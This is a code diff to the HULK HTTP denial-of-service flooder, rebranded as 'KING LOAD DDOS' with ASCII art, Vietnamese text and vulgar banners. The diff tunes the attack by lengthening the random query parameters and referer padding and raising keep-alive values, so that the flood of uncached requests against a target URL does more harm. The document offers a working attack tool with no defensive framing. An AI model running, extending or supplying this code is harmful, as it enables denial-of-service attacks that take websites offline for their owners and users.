@@ -64,15 +64,23 @@ def referer_list():
 def buildblock(size):
 	out_str = ''
 	for i in range(0, size):
-		a = random.randint(95, 120)
+		a = random.randint(100, 130)
 		out_str += chr(a)
 	return(out_str)
 
 def usage():
-	print '---------------------------------------------------'
-	print 'USAGE: python hulk.py <url>'
-	print 'you can add "safe" after url, to autoshut after dos'
-	print '---------------------------------------------------'
+	print 'Mày đéo được phép tấn công chính phủ (can't run)'
+	print '(((((((((((((((((((((((KING LOAD DDOS))))))))))))))))))))))))'
+	print 'CloudFlare""ISP , Vietnam'
+	print 'H  H      l k            DDD  DDD       SSS  
+
+H  H      l k k          D  D D  D     S     
+
+HHHH u  u l kk   --- --- D  D D  D ooo  SSS  
+
+H  H u  u l k k          D  D D  D o o     S 
+
+H  H  uuu l k  k         DDD  DDD  ooo SSSS '
 
 	
 #http request
@@ -84,12 +92,12 @@ def httpcall(url):
 		param_joiner="&"
 	else:
 		param_joiner="?"
-	request = urllib2.Request(url + param_joiner + buildblock(random.randint(4,20)) + '=' + buildblock(random.randint(4,20)))
+	request = urllib2.Request(url + param_joiner + buildblock(random.randint(16,60)) + '=' + buildblock(random.randint(16,60)))
 	request.add_header('User-Agent', random.choice(headers_useragents))
 	request.add_header('Cache-Control', 'no-cache')
 	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
-	request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(35,45)))
-	request.add_header('Keep-Alive', random.randint(180,190))
+	request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(75,85)))
+	request.add_header('Keep-Alive', random.randint(190,200))
 	request.add_header('Connection', 'keep-alive')
 	request.add_header('Host',host)
 	try:
@@ -97,7 +105,7 @@ def httpcall(url):
 	except urllib2.HTTPError, e:
 			#print e.code
 			set_flag(1)
-			print 'Response Code 500'
+			print 'King Load SENT Request 1...2...3...4...5...6...7--NOX'
 			code=500
 	except urllib2.URLError, e:
 			#print e.reason
@@ -124,7 +132,7 @@ class MonitorThread(threading.Thread):
 	def run(self):
 		previous=request_counter
 		while flag==0:
-			if (previous+1000000<request_counter) & (previous<>request_counter):
+			if (previous+100000000<request_counter) & (previous<>request_counter):
 				print "%d Requests Sent" % (request_counter)
 				previous=request_counter
 		if flag==2:
@@ -139,7 +147,7 @@ else:
 		usage()
 		sys.exit()
 	else:
-		print "-- HULK Attack Started --"
+		print "SEX KING LOAD START WITH REQUESTS I AM WILL FUCK WEBSITES SEX"
 		if len(sys.argv)== 3:
 			if sys.argv[2]=="safe":
 				set_safe()
